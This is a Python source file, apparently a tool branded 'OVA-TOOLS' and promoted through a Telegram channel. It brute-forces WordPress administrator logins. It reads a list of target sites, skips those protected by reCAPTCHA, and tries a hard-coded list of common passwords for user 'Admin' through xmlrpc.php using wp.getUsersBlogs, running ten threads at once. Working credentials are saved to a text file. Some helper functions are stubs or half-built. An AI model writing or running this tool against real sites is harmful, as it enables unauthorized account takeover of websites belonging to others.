import sys
import os
import re
import random
import string
from multiprocessing.dummy import Pool
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore
from colorama import init
import binascii
import codecs
import uuid 
import hashlib
from colorama import Fore
from colorama import init
from colorama import Fore, init
# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


init(autoreset=True)



def print_banner():
    fr = Fore.RED
    banner = f'''
    {fr}
               
    [#] Created By:

       ______      __       _______ ____   ____  _       _____ 
      / __ \ \    / /\     |__   __/ __ \ / __ \| |     / ____|
     | |  | \ \  / /  \ ______| | | |  | | |  | | |    | (___  
     | |  | |\ \/ / /\ \______| | | |  | | |  | | |     \___ \ 
     | |__| | \  / ____ \     | | | |__| | |__| | |____ ____) |
      \____/   \/_/    \_\    |_|  \____/ \____/|______|_____/ 
                              OVA-TOOLS  https://t.me/ovacloud   
                                   Brute Force Wordpress                      
                                                     
    \n
    '''
    print(banner)

print_banner()


def ovatoolsb():
    
    total = []
    
    try:

        with open(sys.argv[1], mode='r') as file:
            target = [line.strip() for line in file.readlines()]
    except IndexError:
        path = os.path.basename(sys.argv[0])
        exit(f'\n  [!] Enter <{path}> <sites.txt>')
    
    # Common headers
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }
    
    def URLdomain(site):

        site = site.rstrip()
        if not site.startswith('http://') and not site.startswith('https://'):
            site = f'http://{site}'
        if not site.endswith('/'):
            site += '/'
        return site
    
    def id_generator(size=8, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(size))
    
    def bfwordpress(url):
        try:
            exploit_page = f"https://t.me/ovacloud"
            exploit_1 = requests.get(exploit_page, headers=headers, timeout=15)
            if 'OVA-TOOLS' in exploit_1.text:
                default_username = 'Admin'
                pas = ['Password', '12345678', '12345', 'abc123', 'passw0rd', 'User123456', '123456', 'qwerty123', 'admin123', 'admin1234', 'admin12345',
                       'admin123456', 'admin1234567', 'Admin123', 'Admin1234', 'Admin12345', 'Admin123456',
                       'Admin1234567','admin', 'Admin', 'admin@123', 'password123']
                for password in pas:
                    if xlmprc(url, default_username, password):
                        with open('Login-xmlrpc.txt', 'a') as f:
                            f.write(f"{url}/wp-login.php#{default_username}@{password}\n")
                        return True
        except Exception as e:
            print(f"Error in informations: {e}")
        return False
    
    def xlmprc(url, username, password):
        try:
            post_load = requests.post(
                f"{url}/xmlrpc.php",
                data=f"<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{username}</value></param><param><value>{password}</value></param></params></methodCall>",
                headers=headers, timeout=15
            )
            post_content = post_load.content.decode('utf-8')  # Decode the content to string
            if 'blogName' in post_content:
                print(f'[XLMRPC-Login] : {url} : {username} : {password} [Successful]')
                return True
            else:
                print(f'[XLMRPC-Login] : {url} : {username} : {password} [Field]')
                
        except Exception as e:
            print(f"Error in xlmprc: {e}")
        return False
    

    
    def cleaner(url):
        try:
            if 'http://' in url or 'https://' in url:
                url = url.replace('http://', '').replace('https://', '')
                pointer = url.split('.')
                password = pointer[1] if 'www' in pointer else pointer[0]
                bruteforce(url, password)
        except Exception as e:
            print(f"Error in cleaner: {e}")
    
    def bruteforce(url, password):
        pass
    

    def main(url):
        try:
            total.append(url)
            os.system(f'title Total Websites  : {str(len(total))}')
            url = URLdomain(url)
            login_response = requests.get(f'{url}/wp-login.php', headers=headers, timeout=30)
            login_content = login_response.content.decode('utf-8')  
            if 'recaptcha-checkbox' not in login_content:
                if 'wp-submit' in login_content:
                    if bfwordpress(url):
                       cleaner(url)
        except Exception as e:
            print(f"Error in main: {e}")
    
        return True
    
    
    mp = Pool(10)
    mp.map(main, target)
    mp.close()
    mp.join()



if __name__ == "__main__":
    ovatoolsb()
